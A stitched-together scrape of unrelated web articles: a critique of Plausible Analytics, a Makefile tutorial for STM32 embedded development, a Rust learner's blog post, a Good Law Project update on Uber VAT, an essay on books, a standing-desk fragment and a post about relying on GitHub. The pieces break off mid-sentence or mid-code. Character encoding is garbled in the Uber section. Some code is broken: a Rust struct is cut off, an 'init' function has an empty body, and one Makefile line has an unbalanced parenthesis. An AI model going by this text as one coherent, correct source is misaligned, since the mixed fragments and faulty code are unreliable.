say?</h2><p>I’ll admit to being mildly amused and surprised that privacy-conscious people in the FOSS community are promoting this service. Even more surprising is the fact that they’re configuring CNAME cloaking for their websites. I mean, seriously, you can’t exactly argue ignorance in this matter.</p><p>Plausible Analytics is good at targeted marketing to the right people. However, I don’t personally believe that the product delivers on its promise. Open-source or not, the business model here is still to monetize personal data for profit however you may wish to dress it up.</p></div></div>]]>

<![CDATA[Embedded Programming Without the IDE]]>

  <article>
  <p><img src="http://reecestevens.me/pics/cli_workflow.png" alt="Command Line Workflow"></p>

<p>There are a few things I should disclose before I get into this post:</p>

<ol>
<li>I am a lover of all things terminal.</li>
<li>I am a big <code>vim</code> enthusiast (although certainly not an expert).</li>
<li>I love embedded development.</li>
<li>I really don't love programming in IDEs.</li>
</ol>

<p>Unfortunately, for most of my programming education, I believed that statements
3 and 4 were mutually exclusive. Every embedded project I had worked on
required the use of Keil uVision, Code Composer, Eclipse... the usual
suspects. There is nothing inherently wrong with any of these programs, and in
fact, they significantly lower the barrier to entry for embedded development.
They're widely used for a reason! </p>

<p>That said, I was always slightly frustrated when I
started a project by clicking through a wizard, selecting "Project Template",
and seeing a bunch of mysterious files and directories pop up in my workspace.
What did all that stuff do? Why couldn't I see what was going on? What was all
this boilerplate code doing in my project, and was all that complexity really
necessary? When I would express this frustration to teammates, I would often
get replies like, "Well you can just read the datasheet and program all the
registers manually if you want. Be my guest!" Teams can be snarky sometimes. </p>

<p>And so, when I began working on FreePulse, I began researching to see if there
was a better way. Just before I had given up hope, I came across <a href="https://liviube.wordpress.com/2013/04/22/blink-for-stm32f4-discovery-board-on-linux-with-makefile/">this
wonderful blog post</a> detailing how the author had built
a Makefile for a project on the STM32F4 Discovery board. Seeing as I was
starting my redesign of FreePulse using the same chip, I decided to jump in and
try to drop Eclipse entirely. I'm really pleased with the result, and hopefully
this blog post can guide other people who want to develop for embedded
platforms independent of an IDE.</p>

<p>I'm going to do a brief overview of <code>make</code>, go through some specifics of how to
use <code>make</code> to perform most of the useful IDE compilation functions, and show
how you can integrate that into a very smooth development workflow using only
<code>vim</code> and the command line. Feel free to skip around if you feel like you've
got a good handle on how <code>make</code> works!</p>

<h2>Introducing the Makefile</h2>

<p>When starting out any coding project, one of the first things I do is try to
determine the layout of the program in a <code>Makefile</code>. From the people at the
<a href="https://www.gnu.org/software/make/">Free Software Foundation</a>: </p>

<blockquote>
<p>GNU Make is a tool which controls the generation of executables and other 
  non-source files of a program from the program's source files. <a href="https://www.gnu.org/software/make/">1</a> </p>
</blockquote>

<p><code>make</code> is pretty awesome. While I'm not going to do an exhaustive tutorial on
everything you can do with <code>make</code> (partly because that would take too long, and
partly because I'm still learning more all the time), I'll use it as a tool to
outline the structure of an embedded program. </p>

<p>A broad outline of an embedded development project, in <code>Makefile</code> syntax, would
be:</p>
<div><pre><code data-lang="make"><span># Source Files (all *.c or *.cpp files)</span>
<span>SRCS</span>  <span>=</span> path/to/my/first/source/file.c
<span>SRCS</span> <span>+=</span> path/to/my/second/source/file.c
<span># ...etc</span>

<span># Directories containing your header files (all *.h files)</span>
<span>INC_DIRS</span>  <span>=</span> first/library/with/inc
<span>INC_DIRS</span> <span>+=</span> second/library/with/inc
<span># ...etc</span>
<span>INCLUDE</span> <span>=</span> <span>$(</span>addprefix -I,<span>$(</span>INC_DIRS<span>))</span>

<span># Any compiler options you need to set</span>
<span>CFLAGS</span>  <span>=</span> -Wall 
<span>CFLAGS</span> <span>+=</span> -std<span>=</span>c++11 <span># ...etc </span>

<span># Linker Files (all *.ld files)</span>
<span>LFLAGS</span> <span>=</span> -Tfirstfile.ld -Tsecondfile.ld

<span># Tell make how to compile your *.c files into *.o files </span>
<span>%.o</span><span>:</span> %.<span>c</span>
    gcc -c -o <span>$@</span> <span>$&lt;</span> <span>$(</span>CFLAGS<span>)</span>

<span># Finally, tell make how to build the whole project</span>
<span>final_binary.elf</span><span>:</span> <span>$(</span><span>SRCS</span><span>)</span>
    gcc <span>$(</span>INCLUDE<span>)</span> <span>$(</span>CFLAGS <span>$(</span>LFLAGS<span>)</span> <span>$^</span> -o <span>$@</span>
</code></pre></div>
<p>Woah. While that may seem like a lot to take in, I promise that it's actually
very simple to understand! To break it down:</p>

<ul>
<li><p>We declare our source files, indicated by the .c or .cpp file extensions. These 
hold all the code that makes our awesome application, and it also holds any
source files required by the device libraries.</p></li>
<li><p>We declare the folders that are holding all of our include files, indicated
by the .h file extension. Include files let our separate C/C++ files use
each others functions by holding function declarations, and you tell the
compiler what functions you want by the <code>#include "somefile.h"</code> directive.
It's really important to note (and easy to forget) that <strong>your different
source files don't automagically know what each other contain.</strong> If it isn't
declared in the header file and the header file isn't <code>#include</code>d in the
target file, it won't compile. The <code>addprefix</code> function at the end does just
what you'd expect, since our compiler needs the little <code>-I</code> flags in front of
our include directories to know to look there for our stuff.</p></li>
<li><p>We declare any compiler options, or flags, that are necessary to make the
final binary file that will be saved in the microcontroller memory. I'll go
into exactly what flags you should use a little later in this post.</p></li>
<li><p>We declare all of the linker files, indicated by the .ld file extension, that
we need to use. Linker files are actually for another program by the people
at the Free Software Foundation, appropriately called <code>ld</code> (now the file
extension makes sense). <code>ld</code> is automatically called by <code>gcc</code> or <code>g++</code>, the
two primary C/C++ compilers, so we don't have to worry about the nitty
gritty. Basically though, <code>ld</code> helps tell the compiler <em>how</em> our program is
aligned when it's finally compiled. More on this later.</p></li>
</ul>

<p>The last two blocks of this <code>Makefile</code> snippet is where the magic happens. 
These are rules, which <code>make</code> will use to compile your program. The syntax of
a rule is:</p>
<div><pre><code data-lang="make"><span>target</span><span>:</span> <span>dependencies</span>
    commands to make target from dependencies
</code></pre></div>
<p>The first rule is a special kind of rule in <code>make</code> called a <a href="https://www.gnu.org/software/make/manual/html_node/Pattern-Rules.html#Pattern-Rules">pattern
rule</a>. This rule tells <code>make</code> that if we ever want to make
an object file (i.e. <code>target = %.o</code>) out of a source file (i.e. <code>dependencies =
%.c</code>), we should use the commands specified below by the four-space
indentation. But what on earth was that command given in the example above?</p>
<div><pre><code data-lang="make"><span>%.o</span><span>:</span> %.<span>c</span>
    gcc -c -o <span>$@</span> <span>$&lt;</span> <span>$(</span>CFLAGS<span>)</span>
</code></pre></div>
<p>As we've mentioned before, <code>gcc</code> is a compiler; the <code>-c</code> flag specifies that we
want to compile a source file, and the <code>-o</code> flag says that the next argument
will be the name of the output file. And that name is... <code>$@</code>?</p>

<p>Turns out, there's one last little thing about <code>make</code> we need to learn:
<a href="https://www.gnu.org/software/make/manual/html_node/Automatic-Variables.html#Automatic-Variables">automatic variables</a>. You can read the doc page about all the
different automatic variables that <code>make</code> provides you, but we're going to
focus on the two that we just used here:</p>

<ul>
<li><p><code>$@</code> represents whatever our <code>target</code> is. In this case, <code>$@ == %.o</code>.</p></li>
<li><p><code>$&lt;</code> represents the <strong>first</strong> dependency to the right of the colon. In this
case, since only one dependency is listed, <code>$&lt; == %.c</code>. </p></li>
</ul>

<p>So, after doing a little translation, we see that the pattern rule is telling
<code>make</code> that for every source file (<code>%.c</code>) that we want to turn into an object
file (<code>%.o</code>), it should call our compiler (<code>gcc</code>), tell it to compile (<code>-c</code>)
our source file (<code>$&lt;</code>) into the output file (<code>-o $@</code>) with some compiler
options that we specify (<code>$(CFLAGS)</code>). Not too bad! You're already on your way
to [groking][grok_article] <code>make</code>.</p>

<p>Finally, we have our last rule, which is where everything comes together. </p>
<div><pre><code data-lang="make"><span>final_binary.elf</span><span>:</span> <span>$(</span><span>SRCS</span><span>)</span>
    gcc <span>$(</span>INCLUDE<span>)</span> <span>$(</span>CFLAGS<span>)</span> <span>$(</span>LFLAGS<span>)</span> <span>$^</span> -o <span>$@</span>
</code></pre></div>
<p>We've pretty much covered everything in this rule except for the <code>$^</code> variable,
which is just another <a href="https://www.gnu.org/software/make/manual/html_node/Automatic-Variables.html#Automatic-Variables">automatic variable</a>. <code>$^</code> stands for
<em>every</em> file in the dependencies list, as opposed to <code>$&lt;</code>, which only
represents the <em>first</em>. A cheesy way to remember that is to look at the
direction of the arrow! And armed with that last little bit of knowledge, we
can confidently translate this last rule:</p>

<p>Take all our source files (<code>$(SRCS)</code>), and make them into a final output binary
called <code>final_binary.elf</code>. To do that, call our compiler (<code>gcc</code>), tell it where
our include directories are (<code>$(INCLUDE)</code>), specify our compiler options
(<code>$(CFLAGS)</code>) and our linker files (<code>$(LFLAGS)</code>), and finally give it all our
source files (<code>$^</code>) and tell it what we want the output to be (<code>-o $@</code>). </p>

<p>And just like that, we've outlined the basic build of a C/C++ project!</p>

<h2>Make Make Work for Embedded Programming </h2>

<p>Because of some of the unique aspects of programming for a microcontroller, we
need to be a little more explicit with <code>make</code> about some things. This is where
<a href="https://liviube.wordpress.com/2013/04/22/blink-for-stm32f4-discovery-board-on-linux-with-makefile/">Liviu's blog post</a> really gave me some crucial
guidance; also, this is where we can see how building a <code>Makefile</code> lets us peek
into the mystery of what happens when we hit the "compile and run" button on an
IDE.</p>

<p>Firstly, we need to specify what kind of compiler we'll use. While you may have
<code>gcc</code> or <code>g++</code> installed on you machine, they are built to compile programs on 
your computer architecture. We'll need a special version of <code>gcc</code>, called a
<em>cross-compiler</em>, so that we can compile across architectures to the ARM
architecture. You can download it from <a href="https://launchpad.net/gcc-arm-embedded">this site mirror</a>, or
look for it in a package manager like <code>homebrew</code> (OSX), <code>apt-get</code> (Ubuntu), 
<code>pacman</code> (for Arch Linux), or similar for your distro. </p>

<p>Once you've got the cross-compiler toolset installed, the programs will<br>
probably have really long names (<code>arm-none-eabi-g++</code>, for example). That's
going to be a pain to type all over your <code>Makefile</code>, so you can make variables
to hold the path to your tools. I used <code>TOOLS_DIR</code> to hold the path to the
executables directory in the cross-compiler toolset, and then specified
the tools I'd be using:</p>
<div><pre><code data-lang="make"><span>CC</span>      <span>=</span> <span>$(</span>TOOLS_DIR<span>)</span>/arm-none-eabi-g++
<span>OBJCOPY</span> <span>=</span> <span>$(</span>TOOLS_DIR<span>)</span>/arm-none-eabi-objcopy
<span>GDB</span>     <span>=</span> <span>$(</span>TOOLS_DIR<span>)</span>/arm-none-eabi-gdb
</code></pre></div>
<p>Next, we need to specify the <code>CFLAGS</code> that will help us to compile our program.
Liviu's <code>Makefile</code> was extremely helpful in that it logically grouped the
flags, so we can get a better idea of what's going on. I'm not going to give an
exact description of each flag (you can look up the linked docs for that), but I
will give an overview of each group:</p>

<ul>
<li><code>CFLAGS  = -ggdb</code> sets <a href="https://gcc.gnu.org/onlinedocs/gcc/Debugging-Options.html#Debugging-Options">debugging options</a> so that the compiler will send
information in a format that <code>gdb</code>, the debugging program we'll be using
later, can understand. </li>
<li><code>CFLAGS += -O0</code> tells the compiler to <a href="https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html#Optimize-Options">perform no optimizations</a> on the code.
This is important …</li></ul></article></div></div></div></div>

<p>In this podcast episode of Security Headlines: Carl Lerche, Rust developer and<br>
maintainer of the popular Rust programming library Tokio joins us.<br>
He walks us through what Rust and Tokio is, how companies are building their stacks with Rust.<br>
This and a lot more on this episode of Security Headlines!</p>

<p>Carl heard about this new programming language called Rust and wanted to check it out.
What started as a hobby project led Carl down the rust path and he now works for Amazon as a<br>
Rust developer! Helping Amazon build stable infrastructure.</p>

<p>We get to hear the story of how Tokio got started and how the Rust programming language has changed<br>
over the years.<br>
Since a large chunk of Tokio code is focusing on making it easy for developers to write asynchronous functions.<br>
And be able to write fast code that does not get stuck and lets the data flow.<br>
But how does non-blocking code really work? What differs Rust from the programming language Golang is<br>
Golangs, adoption of green threads instead of using regular threads.<br>
Carl walks us through how this works and how Rust tackles this problem “the Rust way”.</p>

<p>Do you want to build reliable network services with Rust?<br>

<h2 id="my-first-date-with-rust---know-thy-enemy">My First Date with Rust - Know Thy Enemy</h2>
<p>As a working programmer with several mainstream languages under your belt (eg <code>Java</code>, <code>C#</code>, <code>javascript</code>, <code>python</code>, etc) it's reasonable to expect that after a bit of orientation with quirks and syntax you'll find yourself somewhat productive. If you know Rust you won't be surprised when I say my experience was... humbling. </p>
<p>The last time I felt so dumb was probably more than a decade ago, as a novice programmer teaching myself Object Orientated Programming (OOP). I think that's the point, new paradigms require effort to build a working mental model for. And depending on where you start on the ladder you might have quite a lot of mental rebuilding to do.  </p>
<p>Rust intentionally tries to be "boring". That is to say, its DNA borrows liberally from prior art. If you're familiar with manual memory management (<code>C</code>, <code>C++</code>, <code>Obj-C</code>) you'll probably understand pointers in Rust. If you're familiar with functional languages (<code>Haskell</code>, <code>Elm</code>, <code>Clojure</code>, <code>OCaml</code>) you'll have an immediate start recognising the type system. The reason it aims for boring is because it spends its entire novelty budget on the one unique idea: automatic scope based memory allocation (aka the borrow checker). This is the knockout feature: <strong>the performance of C with the safety of garbage collected languages.</strong></p>
<p><a href="http://intorust.com/" target="_blank" rel="nofollow noopener noreferrer">Plenty</a> <a href="https://doc.rust-lang.org/book/ch04-00-understanding-ownership.html" target="_blank" rel="nofollow noopener noreferrer">of ink</a> <a href="https://squidarth.com/rc/rust/2018/05/31/rust-borrowing-and-ownership.html" target="_blank" rel="nofollow noopener noreferrer">has been</a> <a href="https://dev.to/strottos/learn-rust-the-hard-bits-3d26" target="_blank" rel="nofollow noopener noreferrer">written</a> about ownership and the borrow checker. It follows the most unprecedented feature would have the most said about it. There seems to be a common refrain: "<em>It's really hard at first, but stick with it. You'll see, it changes everything</em>". Sounds suspiciously like Vim or Emacs users (please don't fight me). Is it the promised land or just a severe case of Stockholm syndrome?     </p>
<p>Nevertheless, extensive reading had prepared me to expect a big ol' messy fight with the borrow checker. We did tussle, but it went better than expected. Ironically, after years of <code>C#</code> game development, performance concerns have taught me much of the internal dialogue needed to reason about memory lifetimes: "Is this allocated on the stack or heap? Is this going to create allocation (garbage collection) pressure? Is this copying data or mutating it in place?"</p>
<p>In this sense, when the borrow checker complained I could at least appreciate what it was trying to protect me against. And as to be expected, it may be a while yet before I fully grok lifetimes. Controversially though, "Rust's expressive type system" put up a stiffer fight than I anticipated.</p>
<h2 id="stubbing-toes-on-functional-programming">Stubbing Toes on Functional Programming</h2>
<p>Before anyone grabs a pitchfork, this isn't a rant about the unnecessary burden of type systems. Throughout my career, I've favoured statically and strongly typed programming languages. I believe in correctness, and tooling should help you get there. It's why Rust excites me.</p>
<p>Taken to its ultimate conclusion, one arrives at <code>Haskell</code> and other pure functional programming (FP) languages. FP's conceit is trading performance for correctness. As a concerned game developer, this never felt like a bargain I could entertain. Not that it's prevented FP idioms from seeping into the groundwater of other programming languages (see <code>LINQ</code> in <code>C#</code> or <code>map() filter() reduce()</code> in <code>javascript</code> as examples).   </p>
<p>You can see signs of this functional DNA written all over Rust too, immutability by default being the most obvious. However, Rust strikes a wonderfully pragmatic balance. Imperative programming is not outlawed, and many escape hatches exist. Rust is, as far as I'm aware, <strong>the first language that allows you to deploy functional concepts as zero-cost abstractions</strong>. If the borrow checker is the obvious hit single, this is the real album sleeper hit. </p>
<p>I think my undoing was simply that I had a false expectation of equivalence. I'm confident in my type literacy and I can, if we must, talk in-depth about Java design patterns. I've never courted a "proper" functional language, but I recognise their influence. I understood "expressive type system" to be a superset of what I already know. In some respects it is, but in others, it was fundamentally different. I want to share some of my "aha" moments because I haven't seen much written with this lens...  </p>
<h2 id="use-rust-analyzer">Use Rust Analyzer!</h2>
<p>To anyone following my footsteps: <strong>setup your dev environment for code intelligence and type hints</strong> is my best advice. I intentionally offer it here before any code samples make you glaze over and miss it.  </p>
<p><img src="https://thefuntastic.com/blog/2020-10-Rust-Analyser.png" title="Screenshot of Rust Analyser extension in Visual Studio extensions gallery"></p>
<p>At the time of writing (Oct 2020), I found Visual Studio Code with the <a href="https://marketplace.visualstudio.com/items?itemName=matklad.rust-analyzer" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a> extension to be the most reliable path. I learnt this only after naively installing the <a href="https://marketplace.visualstudio.com/items?itemName=rust-lang.rust" target="_blank" rel="nofollow noopener noreferrer"><code>Rust</code></a> extension, which provides a front end for both the earlier <a href="https://github.com/rust-lang/rls" target="_blank" rel="nofollow noopener noreferrer"><code>RLS</code></a> and the more modern <a href="https://rust-analyzer.github.io/" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a>. However, in my experience, the native <code>rust-analyzer</code> extension was vastly superior.</p>
<h2 id="taste-testing-rusts-flavour">Taste Testing Rust's Flavour</h2>
<p>If you can express something as a type, the compiler can offer you guarantees about it. An expressive type system allows you to model domains that weren't possible before, often using simpler machinery too. Rust takes this affordance and runs with it. Types are used for everything, and I do mean <strong>everything</strong>. A lot of problems didn't quite make sense until I learnt to recognise them for what they were: type errors. </p>
<p>However, starting out, there are a few obvious differences I'd put into the "quirks" category. They seem foreign and strange, but acclimatisation comes quickly. I'll only briefly touch on them for those who've never seen Rust before. Exhaustive coverage exists in <a href="https://doc.rust-lang.org/book/ch05-00-structs.html" target="_blank" rel="nofollow noopener noreferrer">the Rust book</a> and <a href="https://fasterthanli.me/articles/i-am-a-java-csharp-c-or-cplusplus-dev-time-to-do-some-rust" target="_blank" rel="nofollow noopener noreferrer">elsewhere</a>.</p>
<p><strong> Rust doesn't have <code>classes</code> and only uses <code>structs</code>:</strong>   </p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>  </pre>
<p><em>"Cool cool. Structs are kinda like classes anyway"</em></p>
<p><strong>Methods are defined in <code>impl</code> blocks instead of the <code>struct</code> definition: </strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>

<span>impl</span> <span>MyData</span> <span>{</span>

	<span>pub</span> <span>fn</span> <span>init</span><span>(</span>x<span>:</span><span>f32</span><span>,</span> y<span>:</span><span>f32</span><span>,</span> z<span>:</span><span>f32</span><span>)</span><span>-&gt;</span> <span>MyData</span><span>{</span>

	<span>}</span>
<span>}</span></pre>
<p> <em>"Okay, separate <code>impl</code> blocks seem like a weird choice. Kinda reminds me of <code>C</code> header files..."</em></p>
<p> Calling methods defined in types is done with a <code>C++</code> like syntax, e.g. <code>Type::method_name()</code>. However, once an instance exists (aka memory has been allocated), members are accessed with regular dot syntax, e.g. <code>instance.method_name()</code>:</p>
<pre><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
    <span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span> 
    
    <span>let</span> y <span>=</span> position<span>.</span>y<span>;</span> 
<span>}</span></pre>
<p><strong>There's no inheritance. Shared behaviours are defined in <code>Traits</code>.</strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span>

<p><em>"Okay, so like <code>Trait</code> is just a different way to spell <code>Interface</code>? Gotcha. But no inheritance? That's pretty wild. But composition over inheritance, am I right?"</em></p>
<p>Now that we've implemented the <code>Drawable</code> Trait, we can call its methods on our struct: </p>
<pre><span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span>

position<span>.</span><span>draw</span><span>(</span><span>)</span><span>;</span> </pre>
<p>That's enough for now, but know there are other plenty of other commendable <a href="https://stevedonovan.github.io/rust-gentle-intro/2-structs-enums-lifetimes.html" target="_blank" rel="nofollow noopener noreferrer">type features</a>, some of which we'll discuss later.</p>
<h2 id="where-the-functional-rubber-meets-the-road">Where the Functional Rubber Meets the Road</h2>
<p>Giant monolithic classes are considered a code smell. A signal that responsibilities need to be separated into separate concerns. Still, OOP maintains the feeling of discrete units. Data and behaviour are contained within the cell walls of the class, or at least within the inheritance chain.   </p>
<p>Rust, by comparison, feels inside out, "itty bitty" and piecemeal. What might have been a single class is instead an accumulation of structs and traits, each defining their own narrow window into data and behaviour. <a href="https://www.infoq.com/presentations/Simple-Made-Easy/" target="_blank" rel="nofollow noopener noreferrer">In this talk</a>, the creator of Clojure, another functional language, describes this quality as "ad-hoc polymorphism". Using only what you need, when you need it. This granular approach maximises the immutable surface area, mutability is limited to where it's necessary.   </p>
<p>In the flame wars of "was OOP a giant mistake?", it's debatable whether <a href="https://stevedonovan.github.io/rust-gentle-intro/object-orientation.html" target="_blank" rel="nofollow noopener noreferrer">Rust allows you to write OOP code</a>. I understand this now not as a wholesale rejection: abstraction and encapsulation remain necessary tools. However, Rust forces you to leave behind features ardents consider harmful, inheritance being the obvious example. Call it "OOP, the good bits" if you will. </p>
<p>Ideas like composition over inheritance or separating data from behaviour have been around for a long time within the OOP world. However, FP encourages new principles, determinism and the avoidance of side effects. Let's look at an example. </p>
<h3 id="fixing-the-billion-dollar-mistake">Fixing the Billion Dollar Mistake</h3>
<p>Tony Hoare, the inventor of the null pointer called it <a href="https://en.wikipedia.org/wiki/Tony_Hoare#Apologies_and_retractions" target="_blank" rel="nofollow noopener noreferrer">his billion-dollar mistake</a>. Any programmer knows the misery of finding an error log littered with <code>Null Reference Exception</code>. But <code>null</code> values are fundamental, like the oxygen we breathe. Whenever I tried to contemplate an alternative I suffered a failure of imagination. <em>"No null values? Far out man."</em> </p>
<p>For a while, in prior languages, I attempted to answer this question by initialising variables with a default value instead of <code>null</code>. That worked when the default value meant something, otherwise, it just piped junk data into the system. Still, in successful cases, I began to appreciate the guarantee  it offered. Any downstream code could trust a variable would be valid and not have to muddy itself with unexpected exceptions.</p>
<p>Software is such that, unfortunately, there will always be cases where initialisation or access of a resource fails. FP provides us with a more complete answer here. It …</p></div></div>

            <div id="page">
                <p><span>Way back in April 2017, we announced we were going to take on HMRC’s</span> <a href="https://rebrand.ly/data-parliament-2017">failure to assess</a> <span>Uber to VAT which corroded public trust, not only in HMRC, but in politics more generally.Â&nbsp;</span></p>
<p><span>And itâ€™s been quite the scrap…Â&nbsp;</span></p>
<p><span>There have been lows – like us spending the money we raised in the crowdfunder trying to get a protective costs order and failing.Â&nbsp;</span></p>
<p><span>And there have been highs – like us persuading the High Court </span><a href="https://rebrand.ly/ewhc-2019"><span>late last year</span></a><span> that a fairly spineless HMRC was allowed to do what the legislation plainly allowed it to do and tell us it had (at last) assessed Uber.</span></p>
<p><span>There have been further lows – as last week when the Court of Appeal refused us permission to bring our judicial review against HMRC.</span></p>
<p><span><span>But ultimately </span><span>we triumphed</span><span>. </span></span><a href="https://rebrand.ly/ussec-10q"><span>Uber’s US accounts</span></a><span> now confirm that HMRC has assessed Uber to VAT on fares – both prospectively and retrospectively.</span></p>
<p><span>And thatâ€™s all we ever wanted.Â&nbsp;</span></p>
<p><span><span>It’s been a long, bumpy (and expensive) ride – if you’ll allow me the metaphor – but we have reached our destination. I am so proud that together we have forced HMRC, belatedly, to act – </span><span>Uber has now been asked to pay the Â£1.5bn of tax they owe the public purse.</span></span></p>
<p><span>We couldnâ€™t have done it without your support. So thank you.</span></p>
<p><span>Iâ€™d also like to thank the lawyers – George Peretz QC, Jack Anderson, Hui Ling McCarthy QC, Christopher Knight, David Greene, Vikram Sachdeva QC, and Alex Rook – who helped out, most for even less than the smell of an oily rag, along the way.</span></p>

<p><span>It is only with your support that we can continue to hold Government to account. If you would like to make a donation, you can do so</span>Â&nbsp;<a href="https://goodlawproject.org/membership">here</a>.</p>

        <blockquote>
<p>‘A room without books is like a body without a soul.’<br>
– Marcus Tullius Cicero</p>
</blockquote>
<p>Books can change your life.</p>
<p>And because of this, I believe we should give books our lives.</p>
<p>See, the brain acts much like a filter. It first observes everything in the world, but then begins the process of feeding the beholder of that brain with limited information. This information directly serves the person’s day-to-day priorities as it desperately acts on a kind of survival instinct. When concerned about the immediate down-to-earth tasks, the brain does little in its way to filter through patterns usually unseen.</p>
<p>A book, however, carries the power to enable a new priority to dictate what enters the mind and the self. The often beautifully crafted words lend the writer permission to provide the reader with a new perspective. Whether if it is a temporary shift or a harmonic, permanent one – a good book can give the reader the ability to change the frequency of it’s internal radio in order to receive new, yet already existing signals.</p>
<p>Books are, simply put, the greatest form of escapism. Whilst like other forms, they allow us to free ourselves of commonplace worldview; a book’s impact on the mind can profoundly alter the reality in which we continue to experience. Scottish whisky distiller, Thomas Dewar, famously spoke out that ‘minds are like parachutes; they only function when open’ and books encourage the parachute cord to be pulled.</p>
<p>Do note, however, that books do not do this by simply sitting proudly on a bookshelf of ego, speaking on behalf of the host at showy dinner parties. No. They require the reader to engage deeply. To hold hands with the writer and let their intentionally crafted pace guide the mind through complex and acroamatic ideas.</p>
<figure><img alt="" src="https://justincampbellplatt.com/media/pages/blog/books-for-life/d55a098df6-1601212153/reading.jpg"></figure>
<p>Nowadays, I frequently arrive toward the end of the month with a hilariously large number floating above the Amazon basket icon. There is not one single item on this large list that isn’t a book. My whole Amazon experience is now exclusive to acquiring great mind-altering writings. Fantasy novelist George R.R. Martin also reads ferociously and attributes this to his strong belief that ‘a mind needs books as a sword needs a whetstone if it is to keep its edge.’</p>
<p>Books have the power to expand the worldview of the reader but are limitless in their ability to do so. They hold tremendous long-term merit as re-reading conducts notions the mind had not previously tempted. Deep personal experiences between reads nudge you to dance with the words you’ve previously danced with, but now, to a different song. Step intentionally, and you’ll find the new song liberating. It’s a complex yet freeing tango, infusing the past, rigid self with the new, more open one.</p>
<p>Books. Give them your life and they will reciprocate with more life. As Ernest Hemingway put it best, <strong>‘there is no friend as loyal as a book.’</strong></p>

Our designers were looking for the elements such as the thickness of the lines, sizes of the fonts, or spacing.

The circuit is open by default with no electricity flowing. When you press a button, it closes the circuit allowing electricity to flow to the motor which will rise or fall. Which direction the motor runs depends on whether you connect live or neural <sup>[citation needed]</sup><br></p><p>To be able to actually re-wire this though and hook everything up the relays, you need to actually understand it working in more detail.

		With everything wired up correctly I could now control both an "up" relay and "down" relay via code.
	</p></section><section><div><h2>Height Sensors</h2><p>With the ability to raise and lower the desk via the relays (and code), I needed to think about how to actually control the desk and get it into a comfortable standing or sitting position automatically.</p><p>One easy approach is to simply raise or lower the desk for a certain amount of time. In other words, to get into the "standing" position just enable the "up" relay for 5 seconds. To go back to "sitting" enable the "down" relay for 5 seconds.</p><p>This doesn't really work though. The desk lowers much more quickly than it raises (due to gravity) so it's very hard to get the correct timings.

<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
